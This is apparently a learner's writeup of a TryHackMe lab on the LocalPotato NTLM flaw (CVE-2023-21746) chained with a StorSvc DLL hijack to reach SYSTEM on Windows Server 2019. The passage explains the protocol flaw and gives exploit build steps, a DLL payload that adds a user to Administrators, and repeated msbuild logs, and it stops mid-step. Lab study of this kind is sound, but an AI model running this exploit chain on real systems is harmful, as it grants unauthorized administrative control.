# LocalPotato — Writeup

## Overview
### LocalPotato — Writeup
### LocalPotato — Writeup
----
Learn how to elevate your privileges on Windows using LocalPotato (CVE-2023-21746).
---
![](https://tryhackme-images.s3.amazonaws.com/room-icons/243755a8229c102a7797a670c505b649.png)
### Introduction
Start Machine
A local privilege escalation (LPE) vulnerability in Windows was reported to Microsoft on September 9, 2022, by Andrea Pierini ([@decoder_it](https://twitter.com/decoder_it)) and Antonio Cocomazzi ([@splinter_code](https://twitter.com/splinter_code)). The vulnerability would allow an attacker with a low-privilege account on a host to read/write arbitrary files with SYSTEM privileges.
Microsoft released a fix for the vulnerability in the January 2023 patch Tuesday, and a working Proof-of-Concept (PoC) was later released on February 10, 2023. The vulnerability was assigned CVE-2023-21746.
While the vulnerability in itself wouldn't directly allow executing commands as SYSTEM, we can combine it with several vectors to achieve this result. Conveniently, on February 13, another privilege escalation PoC was published by [BlackArrowSec](https://twitter.com/BlackArrowSec) that abuses the StorSvc service, allowing an attacker to execute code as SYSTEM as long as they can write a DLL file to any directory in the PATH.
In this room, we will look at both vulnerabilities and combine them to get arbitrary execution as the SYSTEM user.
Starting the VM
You will need to deploy the VM attached to this task by pressing the green `Start Machine` button at the top of the task. The machine should launch in a split-screen view. If it does not, you will need to press the blue `Show Split View` button near the top-right of this page. All of the room can be done in split view, but if you prefer connecting to the machine via RDP, you can use the following credentials:
**Username**
user
**Password**
Password123
Answer the questions below
Start the VM before continuing.
Question Done
### NTLM Authentication Refresher
Before going into how the vulnerability works, let's do a quick refresher on NTLM authentication.
NTLM Authentication
The usual case of NTLM authentication involves a user trying to authenticate to a remote server. Three packets are involved in the authentication process:
-   **Type 1 Message:** The client sends a packet to negotiate the terms of the authentication process. The packet optionally contains the name of the client machine and its domain. The server receives the packet and can check that authentication was started from a different machine.
-   **Type 2 Message:** The server responds to the client with a challenge. The "challenge" is a random number used to authenticate the client without having to pass their credentials through the network.
-   **Type 3 Message:** The client uses the challenge received on the Type 2 message and combines it with the user's password hash to generate a response to the challenge. The response is sent to the server as part of the Type 3 message. That way, the server can check if the client knows the correct user's password hash without transferring it through the network.
NTLM Local Authentication
NTLM local authentication is used when a user tries to log into a service running on the same machine. Since both the client and server applications reside on the same machine, there is no need for the challenge-response process. Authentication is instead performed differently by setting up a Security Context. While we won't dive into the details of what is contained in a Security Context, think of it as a set of security parameters associated with a connection, including the session key and the user whose privileges will be used for the connection.
The process still involves the same three messages as before, but the information used for authentication changes as follows:
-   **Type 1 Message:** The client sends this message to start the connection. It is used to negotiate authentication parameters just like before but also contains the name of the client machine and its domain. The server can check the client's name and domain, and the local authentication process begins if they match their own.
-   **Type 2 Message:** The server creates a Security Context and sends back its ID to the client in this message. The client can then use the Security Context ID to associate itself with the connection.
-   **Type 3 Message:** If the client successfully associates themselves with an existing Security Context ID, an empty Type 3 message is sent back to the server to signal that the local authentication process succeeded.
Since all steps occur on the same machine, there is no need to follow the challenge-response method as before. The machine can validate the Security Context ID for both the server and the client applications.
Answer the questions below
Click and continue learning!
Question Done
### LocalPotato
The LocalPotato PoC takes advantage of a flaw in a special case of NTLM authentication called NTLM local authentication to trick a privileged process into authenticating a session the attacker starts against the local SMB Server. As a result, the attacker ends up having a connection that grants him access to any shares with the privileges of the tricked process, including special shares like `C$` or `ADMIN$`.
The process followed by the exploit is as follows:
1.  The attacker will trigger a privileged process to connect to a rogue server under his control. This works similarly to previous Potato exploits, where an unprivileged user can force the Operating System into creating connections that use a privileged user (usually SYSTEM).
2.  The rogue server will instantiate a **Security Context A** for the privileged connection but won't send it back immediately. Instead, the attacker will launch a rogue client that simultaneously initiates a connection against the local SMB Server (Windows File Sharing) with its current unprivileged credentials. The client will send the Type1 message to initiate the connection, and the server will reply by sending a Type2 message with the ID for a new **Security Context B**.
3.  The attacker will swap the Context IDs from both connections so that the privileged process receives the context of the SMB server connection instead of its own. As a result, the Privileged client will associate its user (SYSTEM) with **Security Context B** of the SMB connection created by the attacker. As a result, the attacker's client can now access any network share with SYSTEM privileges!
By having a privileged connection to SMB shares, the attacker can read or write files to the target machine in any location. While this won't allow us to run commands directly against the vulnerable machine, we will combine this with a different attack vector to achieve that end.
Note that the vulnerability is in the NTLM protocol rather than the SMB Server, so this same attack vector could be theoretically used against any service that leverages authentication through NTLM. In practice, however, some caveats must be dealt with when selecting the protocol to attack. The PoC uses the SMB Server to avoid some extra protections in place for other protocols against similar attack vectors and even implements a quick bypass to get the exploit to work against the SMB Server. While we won't go into these technical details in this room, you can read about them in the [original exploit author's post](https://decoder.cloud//localpotato-when-swapping-the-context-leads-you-to-system/).
Answer the questions below
Click and continue learning!
Question Done
### Abusing StorSvc to Execute Commands
So far, we have used LocalPotato to write arbitrary files to the target machine. To get a privileged shell, we still need to figure out how to use the arbitrary write to run a command.
Recently, another privilege escalation vector was found, where an attacker could hijack a missing DLL to run arbitrary commands with SYSTEM privileges. The only problem with this vector was that an attacker would need to write a DLL into the system's PATH to trigger it. By default, Windows PATH will only include directories that only privileged accounts can write. While it might be possible to find machines where the installation of specific applications has altered the PATH variable and made the machine vulnerable, the attack vector only applies to particular scenarios. Combining this attack with LocalPotato allows us to overcome this restriction and have a fully working privilege escalation exploit.
StorSvc and DLL Hijacking
As discovered by BlackArrowSec, an attacker can send an RPC call to the `SvcRebootToFlashingMode` method provided by the `StorSvc` service, which in turn will end up triggering an attempt to load a missing DLL called `SprintCSP.dll`.
If you are not familiar with RPC, think of it as an API that exposes functions so that they can be used remotely. In this case, the `StorSvc` service exposes the `SvcRebootToFlashingMode` method, which anyone with access to the machine can call.
Since StorSvc runs with SYSTEM privileges, creating SprintCSP.dll somewhere in the PATH will get it loaded whenever a call to `SvcRebootToFlashingMode` is made.
Compiling the Exploit
To make use of this exploit, you will first need to compile both of the provided files:
-   **SprintCSP.dll**: This is the missing DLL we are going to hijack. The default code provided with the exploit will run the whoami command and output the response to `C:\Program Data\whoamiall.txt`. We will need to change the command to run a reverse shell.
-   **RpcClient.exe**: This program will trigger the RPC call to `SvcRebootToFlashingMode`. Depending on the Windows version you are targeting, you may need to edit the exploit's code a bit, as different Windows versions use different interface identifiers to expose `SvcRebootToFlashingMode`.
The projects for both files can be found on `C:\tools\LPE via StorSvc\`.
Let's start by dealing with **RpcClient.exe**. As previously mentioned, we will need to change the exploit depending on the Windows version of the target machine. To do this, we will need to change the first lines of `C:\tools\LPE via StorSvc\RpcClient\RpcClient\storsvc_c.c` so that the correct operating system is chosen. We can use **Notepad++** by right-clicking on the file and selecting **Edit with Notepad++**. Since our machine is running Windows Server 2019, we will edit the file to look as follows:
```c
#if defined(_M_AMD64)

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022

...
```
This will set the exploit to use the correct RPC interface identifier for Windows 2019. Now that the code has been corrected, let's open a developer's command prompt using the shortcut on your desktop. We will build the project by running the following commands:
Command Prompt
```shell-session
C:\> cd C:\tools\LPE via StorSvc\RpcClient\

C:\tools\LPE via StorSvc\RpcClient> msbuild RpcClient.sln
... some output ommitted ...

Build succeeded.
    0 Warning(s)
    0 Error(s)

C:\tools\LPE via StorSvc\RpcClient> move x64\Debug\RpcClient.exe C:\Users\user\Desktop\
```
The compiled executable will be found on your desktop.
Now to compile **SprintCSP.dll**, we only need to modify the `DoStuff()` function on `C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c` so that it executes a command that grants us privileged access to the machine. For simplicity, we will make the DLL add our current user to the **Administrators** group. Here's the code with our replaced command:
```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```
We now compile the DLL and move the result back to our desktop:
Command Prompt
```shell-session
C:\> cd C:\tools\LPE via StorSvc\SprintCSP\

C:\tools\LPE via StorSvc\SprintCSP> msbuild SprintCSP.sln
... some output ommitted ...

Build succeeded.
    6 Warning(s)
    0 Error(s)

C:\tools\LPE via StorSvc\SprintCSP> move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\
```
We are now ready to launch the full exploit chain!
Answer the questions below
![[Pasted image 20230306161104.png]]
```text
system search

//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022

search developer command

**********************************************************************
** Visual Studio 2022 Developer Command Prompt v17.4.5
** Copyright (c) 2022 Microsoft Corporation
**********************************************************************

C:\Program Files\Microsoft Visual Studio\2022\Community>cd C:\tools\LPE via StorSvc\RpcClient\

C:\tools\LPE via StorSvc\RpcClient>msbuild RpcClient.sln
MSBuild version 17.4.1+9a89d02ff for .NET Framework
Building the projects in this solution one at a time. To enable parallel build, please add the "-m" switch.
Build started 3/6/2023 9:15:19 PM.
Project "C:\tools\LPE via StorSvc\RpcClient\RpcClient.sln" on node 1 (default targets).
ValidateSolutionConfiguration:
  Building solution configuration "Debug|x64".
Project "C:\tools\LPE via StorSvc\RpcClient\RpcClient.sln" (1) is building "C:\tools\LPE via StorSvc\RpcClient\RpcClien
t\RpcClient.vcxproj" (2) on node 1 (default targets).
PrepareForBuild:
  Creating directory "x64\Debug\".
  Creating directory "C:\tools\LPE via StorSvc\RpcClient\x64\Debug\".
  Creating directory "x64\Debug\RpcClient.tlog\".
InitializeBuildStatus:
  Creating "x64\Debug\RpcClient.tlog\unsuccessfulbuild" because "AlwaysCreate" was specified.
ClCompile:
  C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.34.31933\bin\HostX64\x64\CL.exe /c /ZI /JMC
  /nologo /W3 /WX- /diagnostics:column /sdl /Od /D _DEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /RTC1 /MT /GS /
  fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"x64\Debug\\" /Fd"x64\Debug\vc143.pdb" /external:W3 /G
  d /TP /FC /errorReport:queue RpcClient.cpp
  RpcClient.cpp
  C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.34.31933\bin\HostX64\x64\CL.exe /c /ZI /JMC
  /nologo /W3 /WX- /diagnostics:column /sdl /Od /D _DEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /RTC1 /MT /GS /
  fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"x64\Debug\\" /Fd"x64\Debug\vc143.pdb" /external:W3 /G
  d /TC /FC /errorReport:queue storsvc_c.c
  storsvc_c.c
Link:
  C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.34.31933\bin\HostX64\x64\link.exe /ERRORREPO
  RT:QUEUE /OUT:"C:\tools\LPE via StorSvc\RpcClient\x64\Debug\RpcClient.exe" /INCREMENTAL /ILK:"x64\Debug\RpcClient.ilk
  " /NOLOGO kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib
   uuid.lib odbc32.lib odbccp32.lib /MANIFEST /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /manifest:embed /DEBUG
  /PDB:"C:\tools\LPE via StorSvc\RpcClient\x64\Debug\RpcClient.pdb" /SUBSYSTEM:CONSOLE /TLBID:1 /DYNAMICBASE /NXCOMPAT
  /IMPLIB:"C:\tools\LPE via StorSvc\RpcClient\x64\Debug\RpcClient.lib" /MACHINE:X64 x64\Debug\RpcClient.obj
  x64\Debug\storsvc_c.obj
  RpcClient.vcxproj -> C:\tools\LPE via StorSvc\RpcClient\x64\Debug\RpcClient.exe
FinalizeBuildStatus:
  Deleting file "x64\Debug\RpcClient.tlog\unsuccessfulbuild".
  Touching "x64\Debug\RpcClient.tlog\RpcClient.lastbuildstate".
Done Building Project "C:\tools\LPE via StorSvc\RpcClient\RpcClient\RpcClient.vcxproj" (default targets).

Done Building Project "C:\tools\LPE via StorSvc\RpcClient\RpcClient.sln" (default targets).

Build succeeded.
    0 Warning(s)
    0 Error(s)

Time Elapsed 00:00:31.25

C:\tools\LPE via StorSvc\RpcClient>move x64\Debug\RpcClient.exe C:\Users\user\Desktop\
        1 file(s) moved.

void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}

C:\tools\LPE via StorSvc\RpcClient>cd C:\tools\LPE via StorSvc\SprintCSP\

C:\tools\LPE via StorSvc\SprintCSP>msbuild SprintCSP.sln
MSBuild version 17.4.1+9a89d02ff for .NET Framework
Building the projects in this solution one at a time. To enable parallel build, please add the "-m" switch.
Build started 3/6/2023 9:24:55 PM.
Project "C:\tools\LPE via StorSvc\SprintCSP\SprintCSP.sln" on node 1 (default targets).
ValidateSolutionConfiguration:
  Building solution configuration "Debug|x64".
Project "C:\tools\LPE via StorSvc\SprintCSP\SprintCSP.sln" (1) is building "C:\tools\LPE via StorSvc\SprintCSP\SprintCS
P\SprintCSP.vcxproj" (2) on node 1 (default targets).
PrepareForBuild:
  Creating directory "x64\Debug\".
  Creating directory "C:\tools\LPE via StorSvc\SprintCSP\x64\Debug\".
  Creating directory "x64\Debug\SprintCSP.tlog\".
InitializeBuildStatus:
  Creating "x64\Debug\SprintCSP.tlog\unsuccessfulbuild" because "AlwaysCreate" was specified.
ClCompile:
  C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.34.31933\bin\HostX64\x64\CL.exe /c /ZI /JMC
  /nologo /W3 /WX- /diagnostics:column /sdl /Od /D _DEBUG /D _CONSOLE /D _WINDLL /D _UNICODE /D UNICODE /Gm- /EHsc /RTC
  1 /MDd /GS /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"x64\Debug\\" /Fd"x64\Debug\vc143.pdb" /ex
  ternal:W3 /Gd /TC /FC /errorReport:queue main.c
  main.c
C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(111,5): warning C4013: 'StopDependentServices' undefined; assuming
extern returning int [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(25,25): warning C4244: 'initializing': conversion from 'ULONGLONG'
to 'DWORD', possible loss of data [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(173,9): warning C4033: 'StopDependentServices' must return a value
[C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(187,9): warning C4033: 'StopDependentServices' must return a value
[C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(163,25): warning C4244: 'initializing': conversion from 'ULONGLONG'
 to 'DWORD', possible loss of data [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(267): warning C4715: 'StopDependentServices': not all control paths
 return a value [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
Link:
  C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.34.31933\bin\HostX64\x64\link.exe /ERRORREPO
  RT:QUEUE /OUT:"C:\tools\LPE via StorSvc\SprintCSP\x64\Debug\SprintCSP.dll" /INCREMENTAL /ILK:"x64\Debug\SprintCSP.ilk
  " /NOLOGO kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib
   uuid.lib odbc32.lib odbccp32.lib /MANIFEST /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /manifest:embed /DEBUG
  /PDB:"C:\tools\LPE via StorSvc\SprintCSP\x64\Debug\SprintCSP.pdb" /SUBSYSTEM:WINDOWS /TLBID:1 /DYNAMICBASE /NXCOMPAT
  /IMPLIB:"C:\tools\LPE via StorSvc\SprintCSP\x64\Debug\SprintCSP.lib" /MACHINE:X64 /DLL x64\Debug\main.obj
     Creating library C:\tools\LPE via StorSvc\SprintCSP\x64\Debug\SprintCSP.lib and object C:\tools\LPE via StorSvc\Sp
  rintCSP\x64\Debug\SprintCSP.exp
  SprintCSP.vcxproj -> C:\tools\LPE via StorSvc\SprintCSP\x64\Debug\SprintCSP.dll
FinalizeBuildStatus:
  Deleting file "x64\Debug\SprintCSP.tlog\unsuccessfulbuild".
  Touching "x64\Debug\SprintCSP.tlog\SprintCSP.lastbuildstate".
Done Building Project "C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj" (default targets).

Done Building Project "C:\tools\LPE via StorSvc\SprintCSP\SprintCSP.sln" (default targets).

Build succeeded.

"C:\tools\LPE via StorSvc\SprintCSP\SprintCSP.sln" (default target) (1) ->
"C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj" (default target) (2) ->
(ClCompile target) ->
  C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(111,5): warning C4013: 'StopDependentServices' undefined; assumin
g extern returning int [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
  C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(25,25): warning C4244: 'initializing': conversion from 'ULONGLONG
' to 'DWORD', possible loss of data [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
  C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(173,9): warning C4033: 'StopDependentServices' must return a valu
e [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
  C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(187,9): warning C4033: 'StopDependentServices' must return a valu
e [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
  C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(163,25): warning C4244: 'initializing': conversion from 'ULONGLON
G' to 'DWORD', possible loss of data [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]
  C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\main.c(267): warning C4715: 'StopDependentServices': not all control pat
hs return a value [C:\tools\LPE via StorSvc\SprintCSP\SprintCSP\SprintCSP.vcxproj]

    6 Warning(s)
    0 Error(s)

Time Elapsed 00:00:02.59

C:\tools\LPE via StorSvc\SprintCSP>move x64\Debug\SprintCSP.dll C:\Users\user\Desktop\
        1 file(s) moved.
```
Compile both exploit files and continue.
Question Done
### Elevating our Privileges
We are now ready to launch the exploit. Make sure you have the `LocalPotato.exe` exploit, the `RpcClient.exe` and the `SprintCSP.dll` files on your desktop before proceeding. If you don't, go back to the previous task to build them.
Let's start by verifying that our current user is not a part of the `Administrators` group:
Command Prompt
```shell-session
C:\> net user user
User name                    user
Full Name

... some output omitted ...

Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.
```
To successfully exploit **StorSvc**, we need to copy `SprintCSP.dll` to any directory in the current PATH. We can verify the PATH by running the following command:
Command Prompt
```shell-session
